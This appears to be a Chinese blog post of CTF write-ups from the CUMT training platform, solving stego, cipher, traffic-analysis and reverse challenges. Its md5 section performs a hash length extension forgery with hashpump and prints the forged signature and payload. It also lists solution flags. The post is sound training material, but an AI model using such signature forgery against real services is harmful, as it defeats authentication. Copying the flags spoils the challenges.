<p>题目提示了是第九届全国大学生信息安全竞赛，可以知道这个题目考察的是曼彻斯特编码，先将题目的16进制转为2进制，根据曼彻斯特编码规则，由低到高即01代表1，由高到低即10代表0，之后转化为16进制之后发现与题目ID不符，还需要每八位进行一下反转，代码如下</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Manchester</span><span class="params">(s)</span>:</span></span><br><span class="line">    ans = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)//<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">if</span> s[i*<span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>] == <span class="string">'01'</span>:</span><br><span class="line">            ans += <span class="string">'1'</span>;</span><br><span class="line">        <span class="keyword">elif</span> s[i*<span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>] == <span class="string">'10'</span>:</span><br><span class="line">            ans += <span class="string">'0'</span>;</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"error in"</span>,i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line">s = <span class="string">"010101010101010101010101010101011001010101010101010110100110010101010101011010101010011010010110101010100110011001100110011001100110100101010101"</span></span><br><span class="line">p = Manchester(s)</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(p)//<span class="number">8</span>):</span><br><span class="line">    flag += p[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>][::<span class="number">-1</span>]</span><br><span class="line">print(hex(int(flag,<span class="number">2</span>)))</span><br></pre></td></tr></table></div></figure><!-- flag{FFFFFED31F645055F9} -->        <h2 id="我就想试试这个名字到底能够起多长">          <a href="#我就想试试这个名字到底能够起多长" class="heading-link"><i class="fas fa-link"></i></a>我就想试试这个名字到底能够起多长</h2>      <p>下载之后丢进stegsolve里面看一下，看一下低色道，发现是504b0304(zip文件头)</p><p><img src="/2018/12/07/cumtctf/18.png" alt="data extract"></p><p>保存为zip格式，但是解压不了，WinRAR修复一下就可以解压了，将解压后的文件拖进hex里面看一下直接就看到了flag。</p><!-- hctf{dd0gf4c3tok3yb0ard4g41n~~~} -->        <h2 id="你的石锅拌饭">          <a href="#你的石锅拌饭" class="heading-link"><i class="fas fa-link"></i></a>你的石锅拌饭</h2>      <p>题目给出了提示信息，<strong><em>培根</em></strong>，可知是培根加密，而且题目字体用了两种字体，就更加确定了，网上查资料发现培根密码有两种加密方式</p><blockquote><p> 第一种方式：<br>    A aaaaa B aaaab C aaaba D aaabb E aabaa<br>    F aabab G aabba H aabbb I abaaa J abaab<br>    K ababa L ababb M abbaa N abbab O abbba<br>    P abbbb Q baaaa R baaab S baaba T baabb<br>    U babaa V babab W babba X babbb Y bbaaa<br>    Z bbaab</p><p>   第二种方式<br>    a AAAAA   g AABBA    n ABBAA   t BAABA<br>    b AAAAB   h AABBB    o ABBAB   u-v BAABB<br>    c AAABA   i-j ABAAA  p ABBBA   w BABAA<br>    d AAABB   k ABAAB    q ABBBB   x BABAB<br>    e AABAA   l ABABA    r BAAAA   y BABBA<br>    f AABAB   m ABABB    s BAAAB   z BABBB</p></blockquote><p>而本题目中说了要大写，所以使用的是第一种加密方式，把题目中正常字体写成A，斜体写成B，转换之后如下</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ABAAAABABBABBBABABABAABAABAABAAABBAAAAABAABAB</span><br></pre></td></tr></table></div></figure><p>对照解密即可，也可以在在线网站解密</p>        <h2 id="shark">          <a href="#shark" class="heading-link"><i class="fas fa-link"></i></a>shark</h2>      <p>题目提示了用wireshark，是一道流量分析题目，打开之后随便浏览发现了ftp登录的信息</p><p><img src="/2018/12/07/cumtctf/24.png" alt="登录认证报文"></p><p>感觉题目应该是和ftp有关，过滤一下ftp协议</p><p><img src="/2018/12/07/cumtctf/25.png" alt></p><p>这就基本确定了本题就是获取这个flag.zip，直接 <code>tcp contains &quot;flag&quot;</code> ，可以看到FTP-DATA协议中传输了flag.zip的数据</p><p><img src="/2018/12/07/cumtctf/26.png" alt></p><p>追踪tcp流，然后可以看到文件头为504b0304，可以确定这就是我们要的flag.zip文件，但是不能直接保存，这样是打不开的，要按照原始数据保存</p><p><img src="/2018/12/07/cumtctf/27.png" alt="save as为flag.zip"></p><p>文件被加密了(不是伪加密)，需要密码，尝试前面登录ftp服务器的密码试一下，直接OK</p><p>解压后的图片没有显示格式，丢进16进制编辑器里面看一下，是个png图片，但是文件头不对，修复一下</p><p><img src="/2018/12/07/cumtctf/28.png" alt></p><p>然后保存为png图片打开就OK了</p><p><img src="/2018/12/07/cumtctf/29.png" alt="We are family!"></p><!-- flag{this_PIcTur3_1s_SO_ugly_} -->        <h2 id="学姐真美">          <a href="#学姐真美" class="heading-link"><i class="fas fa-link"></i></a>学姐真美</h2>      <p>下载之后是一张jpg图片，发现在图片尾部之后还有东西，感觉像是png图片相关的东西，因为有IHDR块，然后在下载一张png图片对着格式修复，本图只需要修复八位即可</p><p><img src="/2018/12/07/cumtctf/16.png" alt="repair"></p><p>是一张二维码，但是只有一小部分，尝试修改图片尺寸，下图中前四个字节是宽度，后四个字节是高度，直接按我的修改为正方形即可</p><p><img src="/2018/12/07/cumtctf/17.png" alt="repair"></p><!-- flag{ChaoRan_is_beautiful!!!} -->        <h2 id="md5">          <a href="#md5" class="heading-link"><i class="fas fa-link"></i></a>md5</h2>      <p>哈希长度扩展攻击，和web里面的 <em>is hash safe?</em> 相同类型，所以原理就不多说了，直接上工具</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# hashpump</span><br><span class="line">Input Signature: 4dbe35eaea655b0a2b0d06391175b8a3</span><br><span class="line">Input Data: r</span><br><span class="line">Input Key Length: 18</span><br><span class="line">Input Data to Add: snow</span><br></pre></td></tr></table></div></figure><p>得到结果</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">65710003c2ff40389b064d3a020487bd</span><br><span class="line">r\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x98\x00\x00\x00\x00\x00\x00\x00snow</span><br></pre></td></tr></table></div></figure><p>第一行md5提交，第二行在前面加上 <strong>cy</strong> 在将 <code>\x</code> 换成空格，字母换成16进制表示即可，最终为</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">63 79 72 80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 98 00 00 00 00 00 00 00 73 6E 6F 77</span><br></pre></td></tr></table></div></figure><p>提交即可得到flag</p>        <h2 id="大家来找茬">          <a href="#大家来找茬" class="heading-link"><i class="fas fa-link"></i></a>大家来找茬</h2>      <p>既然说了大家来找茬，感觉图片肯定有问题，估计是两张，binwalk一下发现果然是两个，foremost分离一下，本来以为是盲水印但是发现不是，百度发现了一个compare命令，试了一下居然得到个二维码，扫码得到flag</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compare 00000000.png 00000668.png 3.png</span><br></pre></td></tr></table></div></figure><p><img src="/2018/12/07/cumtctf/32.png" alt></p>        <h2 id="据说是个签到题">          <a href="#据说是个签到题" class="heading-link"><i class="fas fa-link"></i></a>据说是个签到题</h2>      <p>流量分析，打开之后先过滤一下http包，只有两个http，发现其中一个请求为 <code>GET /evaltest/something/welcome/web/upload_function/upload/c2hlbGw=.php HTTP/1.1\r\n</code> ，感觉应该上传了什么东西，于是过滤tcp包 <code>tcp contains &quot;upload&quot;</code> 发现了数据传输，从第二个开始追踪tcp流</p><p><img src="/2018/12/07/cumtctf/15.png" alt></p><p>发现了flag，但是经过了function.py的加密，不过题目也给出了代码，所以直接用它的代码解密一下即可，但是要把密文base64解密一下，代码如下</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(encrypted, passphrase)</span>:</span></span><br><span class="line">  IV = encrypted[:<span class="number">16</span>]</span><br><span class="line">  aes = AES.new(passphrase, AES.MODE_CBC, IV)</span><br><span class="line">  <span class="keyword">return</span> aes.decrypt(encrypted[<span class="number">16</span>:])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(message, passphrase)</span>:</span></span><br><span class="line">  IV = message[:<span class="number">16</span>]</span><br><span class="line">  length = <span class="number">16</span></span><br><span class="line">  count = len(message)</span><br><span class="line">  padding = length - (count % length)</span><br><span class="line">  message = message + <span class="string">"\0"</span> * padding</span><br><span class="line">  aes = AES.new(passphrase, AES.MODE_CBC, IV)</span><br><span class="line">  <span class="keyword">return</span> aes.encrypt(message)</span><br><span class="line">IV = <span class="string">'YUFHJKVWEASDGQDH'</span></span><br><span class="line">a = <span class="string">"mbZoEMrhAO0WWeugNjqNw3U6Tt2C+rwpgpbdWRZgfQI3MAh0sZ9qjnziUKkV90XhAOkIs/OXoYVw5uQDjVvgNA=="</span></span><br><span class="line">b = base64.b64decode(a)</span><br><span class="line"><span class="keyword">print</span> decrypt(b,<span class="string">"Qq4wdrhhyEWe4qBF"</span>)</span><br></pre></td></tr></table></div></figure>        <h2 id="萌萌哒">          <a href="#萌萌哒" class="heading-link"><i class="fas fa-link"></i></a>萌萌哒</h2>      <p>颜文字密码(aaencode)，在线解码一下</p><blockquote><p>alert(“3Nc0d3.txt”)</p></blockquote><p>访问一下这个txt文件，发现是brainfuck编码，之后再OOK!解码一下可以得到flag</p><!-- flag{My_Br@iN_is_B00m_@_@} -->        <h2 id="魂斗罗">          <a href="#魂斗罗" class="heading-link"><i class="fas fa-link"></i></a>魂斗罗</h2>      <p>下载下来是个nes文件，要用fc模拟器打开，是个魂斗罗游戏，通关就可以得到flag，下载一个virtualnes软件即可运行，再用金手指输入一些秘籍来帮助我们通关，我只用了一个无限命的秘籍，其实用金身比较好，秘籍代码如下</p><p><img src="/2018/12/07/cumtctf/30.png" alt></p><p>然后开启1p模式通过即可，一共好像是8关</p><p><img src="/2018/12/07/cumtctf/31.png" alt></p><p>注意flag里面的字符是5不是s！</p><!-- hctf{ju5tf0rfun} -->        <h2 id="传感器2">          <a href="#传感器2" class="heading-link"><i class="fas fa-link"></i></a>传感器2</h2>      <p>前面一道题目的加强版， 按照之前题目的步骤求一下ID值</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">45psi: fffffed31f635055f8</span><br><span class="line">30psi: fffffed31f425055d7</span><br></pre></td></tr></table></div></figure><p>可以看出有两处不同，分别是63==42，f8==d7，看了大佬的wp后得到前面的两位是与psi有关，最后两位是校验值，校验值是从ID开始的每两位相加的和模256，例如对于第一个 fe+d3+1f+63+50+55=2f8=&gt;2f8%256=f8(注意是十六进制数)。前面的与psi对应的值可以按照比例计算即psi值为30时计算方式为</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># py3</span></span><br><span class="line">a = (int(<span class="string">'63'</span>,<span class="number">16</span>)-int(<span class="string">'42'</span>,<span class="number">16</span>))/<span class="number">15</span> * <span class="number">5</span></span><br><span class="line">b = int(<span class="string">'42'</span>,<span class="number">16</span>) - int(a)</span><br><span class="line">print(hex(b))</span><br><span class="line"><span class="comment"># @ans=0x37</span></span><br></pre></td></tr></table></div></figure><p>补上ID之后求校验码</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">"feb757375055"</span></span><br><span class="line">sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)//<span class="number">2</span>):</span><br><span class="line">    sum += int(a[i*<span class="number">2</span>:i*<span class="number">2</span>+<span class="number">2</span>],<span class="number">16</span>)</span><br><span class="line">print(hex(sum%<span class="number">256</span>))</span><br><span class="line"><span class="comment"># @ans=0xe8</span></span><br></pre></td></tr></table></div></figure><p>那么最终的明文为 <code>FFFFFEB757375055E8</code></p><!-- flag{FFFFFEB757375055E8} -->        <h2 id="猜猜看">          <a href="#猜猜看" class="heading-link"><i class="fas fa-link"></i></a>猜猜看</h2>      <p>题目说了是一个j开头的隐写工具，Google发现了下是jphs，下载了这个软件，可以在dos下运行</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jpseek.exe guess_flag.jpg flag.txt</span><br></pre></td></tr></table></div></figure><p>提取需要密码，猜测了几次发现密码为flag，在flag.txt文件中发下了二进制文本，转为16进制看一下</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">""</span> <span class="comment"># 此处应为flag.txt中的二进制串</span></span><br><span class="line">hex_s = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(s)//<span class="number">8</span>):</span><br><span class="line">    hex_s += hex(int(s[i*<span class="number">8</span>:i*<span class="number">8</span>+<span class="number">8</span>],<span class="number">2</span>))[<span class="number">2</span>:<span class="number">4</span>]</span><br><span class="line">print(hex_s)</span><br></pre></td></tr></table></div></figure><p>在线解码为字符串</p><figure class="highlight plain"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;data:image&#x2F;png;base64,iVBORw0KGgoAAAANSUhEUgAAARgAAAEYCAIAAAAI7H7bAAAFR0lEQVR4nO3dQY5bNxBAQU+Q+1&#x2F;ZOUGIgHlqN2eqtoYljfQfuGiQ&#x2F;Pr9+&#x2F;cv4P&#x2F;5609&#x2F;APgOhAQBIUFASBAQEgSEBAEhQUBIEPj78G9fX19jnyOXD5onv43Dh7&#x2F;7GPkLLnmvSecnyooEASFBQEgQEBIEhAQBIUFASBAQEgROA9mDJftq8wHf09PJux&#x2F;l7hPmD8DrT5QVCQJCgoCQICAkCAgJAkKCgJAgICQIXA5kD5bMGQ&#x2F;u5oyT08mD&#x2F;YPL&#x2F;XuTP&#x2F;EdWpEgICQICAkCQoKAkCAgJAgICQJCgkA&#x2F;kH1aPqs9WDK4XDLhfZ0VCQJCgoCQICAkCAgJAkKCgJAgICQI&#x2F;MSB7ORxu3dD0qdPTv6ZrEgQEBIEhAQBIUFASBAQEgSEBAEhQaAfyH7XHZf5Ib2Tu3EP9v9e+z&#x2F;hLysSJIQEASFBQEgQEBIEhAQBIUFASBC4HMg+va1y&#x2F;22wk7PaJTfqPv1E&#x2F;bIiQUJIEBASBIQEASFBQEgQEBIEhASBrye2H26wZAS5f9z5M58oKxIEhAQBIUFASBAQEgSEBAEhQUBIEBgdyOYjyMkXnNwuerDkvQ6efqKuWZEgICQICAkCQoKAkCAgJAgICQJCgsDokcWTd63evWBuyfHIB0tmmkuG9desSBAQEgSEBAEhQUBIEBASBIQEASFB4HIgu8TTF4&#x2F;ezWon9wvn8g3Iex4AKxIEhAQBIUFASBAQEgSEBAEhQUBIEDgdWbzkQOA7k&#x2F;tql2wX3e&#x2F;pw6LPrEgQEBIEhAQBIUFASBAQEgSEBAEhQeC0Q3Zy0+LkPO7p85aXDH&#x2F;3HxZ95&#x2F;r3siJBQEgQEBIEhAQBIUFASBAQEgSEBIHLI4uX3N25ZFZ78PT8dMmv&#x2F;MQlwlYkCAgJAkKCgJAgICQICAkCQoKAkCDwbe+QnRwm7t&#x2F;4eWfJtmVHFsNPISQICAkCQoKAkCAgJAgICQJCgsDlHbJLdiYOD9022H+x73c9A9mRxfBxQoKAkCAgJAgICQJCgoCQICAkCPR3yN6ZvKF1cgS55Duc3BQ8OSXfM8a1IkFASBAQEgSEBAEhQUBIEBASBIQEgdNAdslJvN916prPT&#x2F;P3WnJR7MGe04ytSBAQEgSEBAEhQUBIEBASBIQEASFBoL9DNp92LRm63b1gPnV9+pTm&#x2F;SPj6yfKigQBIUFASBAQEgSEBAEhQUBIEBASBC7vkD1YMj+9s+Qo5oMlxyNPWnIusYEsfJyQICAkCAgJAkKCgJAgICQICAkC&#x2F;Q7ZgyWTtUmTM+inL6U9eOLvsiJBQEgQEBIEhAQBIUFASBAQEgSEBIHTQHbJrtX9m0yXDC73f4w7kwcdX394KxIEhAQBIUFASBAQEgSEBAEhQUBIEDgNZJ&#x2F;emjq5G3dywjtpzw2tFy84zIoEASFBQEgQEBIEhAQBIUFASBAQEgQujyx+emI4uZN0cl&#x2F;t03t4J9&#x2F;rE3+yFQkCQoKAkCAgJAgICQJCgoCQICAkCPR3yE7e+HlnydbUJbPa3J5dq&#x2F;&#x2F;mE7+yFQkCQoKAkCAgJAgICQJCgoCQICAkCPQD2adNDkmX7DI+mPyTl5xm7A5Z+JOEBAEhQUBIEBASBIQEASFBQEgQ+IkD2SWT0HwEObmVeNKS7b3nr9eKBAEhQUBIEBASBIQEASFBQEgQEBIE+oHsknHnnckh6eG9Jg9VXvJeB&#x2F;kO2U9cL2tFgoCQICAkCAgJAkKCgJAgICQICAkCX58YTm3w9G2wk&#x2F;8r9&#x2F;TI+JoVCQJCgoCQICAkCAgJAkKCgJAgICQInAaywH9kRYKAkCAgJAgICQJCgoCQICAkCAgJAkKCwD96oQOE684L1QAAAABJRU5ErkJggg&#x3D;&#x3D;&quot;&gt;&lt;&#x2F;img&gt;</span><br></pre></td></tr></table></div></figure><p>一看就是个base64编码的图片，解码一下是个二维码，扫码即可得到flag</p><p><img src="/2018/12/07/cumtctf/33.png" alt="answer"></p><p>这题还发现个stegdetect工具，收获挺大。</p><!-- flag{owid0-o91hf-9iahg} -->        <h1 id="REVERSE">          <a href="#REVERSE" class="heading-link"><i class="fas fa-link"></i></a>REVERSE</h1>              <h2 id="Gift">          <a href="#Gift" class="heading-link"><i class="fas fa-link"></i></a>Gift</h2>      <p>题目要让使用jeb，但是没找到工具，所以使用了kali下面的apktools，直接运行命令进行反编译</p><figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool d Gift.apk</span><br></pre></td></tr></table></div></figure><p>在Gift/smali/com/example/gift/flag.smail文件夹下面即可看到flag。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;CUMT网络安全实训平台题目记录&lt;/p&gt;
    
    </summary>
    
      <category term="writeup" scheme="http://chaosec.top/categories/writeup/"/>
    
    
      <category term="CTF" scheme="http://chaosec.top/tags/CTF/"/>
    
  </entry>
  
</feed>
